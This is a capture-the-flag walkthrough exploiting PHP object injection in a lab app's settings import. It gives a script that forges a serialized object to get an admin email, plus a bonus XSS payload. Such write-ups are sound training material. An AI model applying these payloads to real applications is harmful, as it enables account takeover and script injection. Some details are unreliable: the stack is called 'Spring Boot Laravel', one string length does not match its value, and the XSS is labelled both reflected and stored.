# Object Injection (PHP) — HTBank

Target: Spring Boot Laravel app with export/import settings feature using `serialize`/`unserialize`.

---

## Vulnerability

`app/Http/Controllers/HTController.php` line 127:
```php
$userSettings = unserialize(base64_decode($request['settings']));
$user->name = $userSettings->getName();
$user->email = $userSettings->getEmail();
$user->password = $userSettings->getPassword();
$user->profile_pic = $userSettings->getProfilePic();
$user->save();
```

No validation before `unserialize`. Attacker controls all user fields including email.

**Registration blocks `@htbank.com` emails** — but the import path has no such check.

---

## Attack Flow

### 1. Register + Login
```
POST /register → email: user@test.com, password: pass123
POST /login → authenticate
```

### 2. Export Settings
```
POST /settings-ie → export=1
```
Response (flash session) contains base64-encoded serialized `UserSettings`:
```
O:24:"App\Helpers\UserSettings":4:{
  s:30:"\x00App\Helpers\UserSettings\x00Name";s:N:"<name>";
  s:31:"\x00App\Helpers\UserSettings\x00Email";s:N:"<email>";
  s:34:"\x00App\Helpers\UserSettings\x00Password";s:60:"<bcrypt>";
  s:36:"\x00App\Helpers\UserSettings\x00ProfilePic";s:11:"default.jpg";
}
```
Note: private properties serialize with null-byte class name prefix: `\x00ClassName\x00Property`.

### 3. Generate Malicious Payload (PHP)
```php
<?php
include('app/Helpers/UserSettings.php');
$hash = password_hash('yourpass', PASSWORD_BCRYPT);
$obj = new \App\Helpers\UserSettings('name', 'admin@htbank.com', $hash, 'default.jpg');
echo base64_encode(serialize($obj));
```

Or modify the exported bytes directly — change email string length + value:
```
s:16:"user@test.com" → s:16:"admin@htbank.com"  (adjust length accordingly)
```

### 4. Import Modified Payload
```
POST /settings-ie → import=1, settings=<new_base64>
```

### 5. Get Flag
Dashboard is at `/` (not `/dashboard`). With email matching `@htbank.com`:
```php
@if (preg_match("/^.*@htbank.com$/i", auth()->user()->email))
<div class="alert alert-success">HTB{...}</div>
@endif
```

---

## Reflected XSS (Bonus)

The import flash message uses `{!! ... !!}` (no HTML escaping):
```php
Session::flash('ie-message', "Imported settings for '" . $userSettings->getName() . "'");
```
```html
<p class="text-success">{!! Session::get('ie-message') !!}</p>
```

Set Name to `<script>alert(1)</script>` in the payload → stored XSS on import confirmation.

---

## Key Notes

- **Route:** dashboard is at `/`, not `/dashboard`
- **Email uniqueness:** DB has a UNIQUE constraint — importing the same `@htbank.com` email twice → 500 error. Use a fresh email each attempt.
- **Session:** Laravel may invalidate the session after `$user->save()` if the password hash changes. Re-login with the new email after import.
- **Referer header:** `return back()` uses the Referer to redirect — send it in the import POST to get redirected to `/settings` instead of an error.
- **PHP generation:** Always generate the serialized object using the actual class (PHP) rather than manually crafting bytes, to avoid null-byte encoding issues.
